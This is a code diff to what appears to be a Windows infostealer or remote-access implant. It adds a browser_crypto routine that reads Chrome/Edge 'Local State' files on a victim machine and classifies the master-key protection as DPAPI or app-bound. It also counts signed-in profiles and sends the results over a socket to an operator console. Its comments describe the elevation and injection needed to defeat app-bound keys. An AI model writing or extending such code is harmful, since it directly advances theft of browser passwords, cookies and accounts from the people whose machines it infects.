@@ -764,6 +764,42 @@ static void browser_profile(SOCKET s, const char* browser, const char* root,
     b_extensions(s, browser, root, profile);
 }
 
+/* Report how the profile keeps its secrets so the console's 配置摘要 is not
+   empty. Chrome/Edge moved to app-bound (v20) keys, which need elevation and
+   injection; the operator has to know which case a host is in. */
+static void browser_crypto(SOCKET s, const char* browser, const char* root) {
+    char path[MAX_PATH], flag[8];
+    static char buf[64 * 1024];
+    DWORD rd = 0;
+    HANDLE h;
+    int app_bound = 0, dpapi = 0, n = 0;
+    snprintf(path, sizeof(path), "%s\\Local State", root);
+    h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
+                    NULL, OPEN_EXISTING, 0, NULL);
+    if (h == INVALID_HANDLE_VALUE) {
+        b_line(s, "K", browser, "-", "os_crypt", "无 Local State", 0, NULL);
+        return;
+    }
+    ReadFile(h, buf, sizeof(buf) - 1, &rd, NULL);
+    CloseHandle(h);
+    buf[rd] = 0;
+    if (strstr(buf, "\"app_bound_encrypted_key\"")) app_bound = 1;
+    /* encrypted_key is base64("DPAPI" + blob), so the value starts with RFBBUEk */
+    if (strstr(buf, "\"encrypted_key\":\"RFBBUEk")) dpapi = 1;
+    snprintf(flag, sizeof(flag), "%s", app_bound ? "v20 (App-Bound)" : dpapi ? "v10 (DPAPI)" : "未识别");
+    b_line(s, "K", browser, "-", "os_crypt", flag, 0, NULL);
+    {
+        /* one "user_name" per signed-in profile in profile.info_cache */
+        const char* p = buf;
+        while ((p = strstr(p, "\"user_name\"")) != NULL) { n++; p++; }
+    }
+    if (n > 0) {
+        char cnt[16];
+        snprintf(cnt, sizeof(cnt), "%d", n);
+        b_line(s, "K", browser, "-", "profiles", cnt, 0, NULL);
+    }
+}
+
 static void browser_version(SOCKET s, const char* browser, const char* root) {
     char path[MAX_PATH], v[64];
     DWORD rd = 0;
@@ -813,7 +849,10 @@ void handle_browser(SOCKET s) {
                             defs[i].firefox ? firefox_files : chrome_files);
         } while (FindNextFileA(h, &fd));
         FindClose(h);
-        if (!defs[i].firefox) browser_version(s, defs[i].name, root);
+        if (!defs[i].firefox) {
+            browser_version(s, defs[i].name, root);
+            browser_crypto(s, defs[i].name, root);
+        }
     }
     send_frame(s, RSP_END, NULL, 0);
 }
